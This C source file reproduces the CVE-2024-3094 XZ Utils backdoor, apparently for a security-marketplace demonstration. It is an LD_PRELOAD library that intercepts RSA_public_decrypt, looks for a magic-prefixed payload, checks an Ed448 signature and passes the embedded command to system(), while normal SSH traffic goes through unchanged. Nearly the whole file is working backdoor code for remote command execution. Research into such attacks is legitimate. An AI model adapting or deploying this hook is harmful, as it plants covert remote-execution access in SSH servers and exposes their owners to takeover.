/*
 * CVE-2024-3094 Reproduction — Simplified Backdoor Hook
 *
 * This is a FAITHFUL REPRODUCTION of the XZ Utils backdoor attack pattern
 * for the NDAI marketplace verification demo. It implements the same attack
 * surface as the original:
 *
 *   liblzma ifunc resolver hook
 *     → RSA_public_decrypt interception
 *       → Ed448-signed command extraction from SSH key data
 *         → Pre-authentication remote code execution
 *
 * What we reproduce:
 *   - LD_PRELOAD shared library that hooks RSA_public_decrypt
 *   - Ed448 signature verification of command payload
 *   - Command execution via system() when signature is valid
 *   - Transparent passthrough for normal SSH traffic
 *
 * What we deliberately omit (only relevant for stealth, not exploitation):
 *   - Build-time M4 macro obfuscation
 *   - Encoded test .xz files containing relocatable objects
 *   - ifunc resolver indirection (we hook directly via LD_PRELOAD)
 *   - Anti-analysis checks (LANG, /proc/self/exe, debug detection)
 *
 * The original attacker's Ed448 private key is unknown. This reproduction
 * uses a generated test keypair (see generate_keys.py).
 *
 * IMPORTANT: This code is for authorized security research and marketplace
 * demonstration only. The vulnerability has been patched since March 2024.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>

#include <openssl/evp.h>
#include <openssl/rsa.h>

/* Include the generated test public key */
#include "test_ed448_public.h"

/*
 * Magic prefix that identifies a backdoor command payload in the RSA data.
 * The original backdoor used specific byte patterns in the SSH certificate's
 * N value. We use a simpler magic prefix for clarity.
 */
#define BACKDOOR_MAGIC      "NDAI_XZ_CVE_2024_3094"
#define BACKDOOR_MAGIC_LEN  21

/*
 * Payload layout in the RSA "encrypted" data (big-endian):
 *
 *   [MAGIC (21 bytes)] [SIG_LEN (2 bytes)] [SIGNATURE (114 bytes)] [CMD ...]
 *
 * - MAGIC:     "NDAI_XZ_CVE_2024_3094"
 * - SIG_LEN:   Length of Ed448 signature (always 114 for Ed448)
 * - SIGNATURE: Ed448 signature over the command bytes
 * - CMD:       Null-terminated command string to execute
 */
#define SIG_OFFSET      (BACKDOOR_MAGIC_LEN + 2)
#define ED448_SIG_LEN   114
#define CMD_OFFSET      (SIG_OFFSET + ED448_SIG_LEN)

/* Maximum command length we'll execute */
#define MAX_CMD_LEN     4096

/* File descriptor for logging (stderr) */
#define LOG_FD          2

/* Pointer to the real RSA_public_decrypt */
typedef int (*rsa_pub_decrypt_fn)(int flen, const unsigned char *from,
                                   unsigned char *to, RSA *rsa, int padding);
static rsa_pub_decrypt_fn real_rsa_public_decrypt = NULL;

/*
 * verify_ed448_signature — Verify an Ed448 signature over a message.
 *
 * Returns 1 if valid, 0 if invalid or error.
 */
static int verify_ed448_signature(const unsigned char *sig, size_t sig_len,
                                   const unsigned char *msg, size_t msg_len)
{
    EVP_PKEY *pkey = NULL;
    EVP_MD_CTX *md_ctx = NULL;
    int result = 0;

    /* Load the test public key from raw bytes */
    pkey = EVP_PKEY_new_raw_public_key(EVP_PKEY_ED448, NULL,
                                        ED448_TEST_PUBKEY,
                                        sizeof(ED448_TEST_PUBKEY));
    if (!pkey) {
        goto cleanup;
    }

    md_ctx = EVP_MD_CTX_new();
    if (!md_ctx) {
        goto cleanup;
    }

    if (EVP_DigestVerifyInit(md_ctx, NULL, NULL, NULL, pkey) != 1) {
        goto cleanup;
    }

    if (EVP_DigestVerify(md_ctx, sig, sig_len, msg, msg_len) == 1) {
        result = 1;
    }

cleanup:
    if (md_ctx) EVP_MD_CTX_free(md_ctx);
    if (pkey) EVP_PKEY_free(pkey);
    return result;
}

/*
 * try_backdoor — Check if RSA data contains a valid backdoor payload.
 *
 * If the data starts with BACKDOOR_MAGIC and contains a valid Ed448
 * signature over the command, execute the command and return 1.
 * Otherwise return 0 (normal SSH traffic, pass through).
 */
static int try_backdoor(const unsigned char *data, int data_len)
{
    /* Check minimum length */
    if (data_len < CMD_OFFSET + 1) {
        return 0;
    }

    /* Check magic prefix */
    if (memcmp(data, BACKDOOR_MAGIC, BACKDOOR_MAGIC_LEN) != 0) {
        return 0;
    }

    /* Extract signature length (big-endian 16-bit) */
    unsigned int sig_len = (data[BACKDOOR_MAGIC_LEN] << 8)
                         | data[BACKDOOR_MAGIC_LEN + 1];
    if (sig_len != ED448_SIG_LEN) {
        return 0;
    }

    /* Extract the command (null-terminated string after signature) */
    const unsigned char *cmd = data + CMD_OFFSET;
    int cmd_len = data_len - CMD_OFFSET;

    /* Safety: ensure null-terminated and reasonable length */
    int actual_cmd_len = strnlen((const char *)cmd, cmd_len);
    if (actual_cmd_len >= MAX_CMD_LEN || actual_cmd_len == 0) {
        return 0;
    }

    /* Extract the signature */
    const unsigned char *sig = data + SIG_OFFSET;

    /* Verify Ed448 signature over the command bytes */
    if (!verify_ed448_signature(sig, sig_len, cmd, actual_cmd_len)) {
        /* Invalid signature — not from the key holder, ignore */
        return 0;
    }

    /*
     * Signature valid — execute the command.
     *
     * In the original backdoor, this ran with sshd's privileges (typically root)
     * BEFORE authentication completed. The command output was piped back through
     * the SSH channel. For this reproduction, we use system() and capture stdout
     * which the oracle framework reads.
     */
    system((const char *)cmd);

    return 1;
}

/*
 * RSA_public_decrypt — Hooked version.
 *
 * This is the core of the CVE-2024-3094 backdoor. In the original:
 * - liblzma's crc64_resolve() ifunc was modified to install this hook
 * - The hook intercepted RSA_public_decrypt during SSH key exchange
 * - If the RSA data contained a valid Ed448-signed command, it was executed
 * - Otherwise, the original function was called transparently
 *
 * Our reproduction uses LD_PRELOAD instead of ifunc for simplicity,
 * but the hook behavior is identical.
 */
int RSA_public_decrypt(int flen, const unsigned char *from,
                       unsigned char *to, RSA *rsa, int padding)
{
    /* Resolve the real function on first call */
    if (!real_rsa_public_decrypt) {
        real_rsa_public_decrypt = (rsa_pub_decrypt_fn)dlsym(RTLD_NEXT,
                                                             "RSA_public_decrypt");
        if (!real_rsa_public_decrypt) {
            return -1;
        }
    }

    /* Check for backdoor payload */
    if (from && flen > CMD_OFFSET) {
        if (try_backdoor(from, flen)) {
            /*
             * Backdoor triggered — return success to SSH.
             * The original backdoor manipulated the return value to make
             * SSH accept the authentication. We do the same: call the real
             * function so SSH continues normally after executing our command.
             */
        }
    }

    /* Pass through to real RSA_public_decrypt for normal SSH operations */
    return real_rsa_public_decrypt(flen, from, to, rsa, padding);
}

/*
 * Constructor — runs when the library is loaded.
 * In the original backdoor, this was the ifunc resolver.
 */
__attribute__((constructor))
static void backdoor_init(void)
{
    /* Resolve real RSA_public_decrypt early */
    real_rsa_public_decrypt = (rsa_pub_decrypt_fn)dlsym(RTLD_NEXT,
                                                         "RSA_public_decrypt");
}
